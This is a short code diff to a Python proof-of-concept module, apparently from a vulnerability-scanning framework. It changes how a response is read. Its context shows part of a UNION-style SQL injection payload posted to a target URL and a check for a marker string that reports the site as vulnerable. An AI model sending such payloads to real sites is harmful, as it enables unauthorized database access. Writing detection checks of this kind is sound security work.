@@ -62,7 +62,7 @@ class Poc(ABPoc):
                 '''NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'''
             request = urllib.request.Request(verify_url, post_content)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if '526ae11a7ea509bd8338660e908ce9e0' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
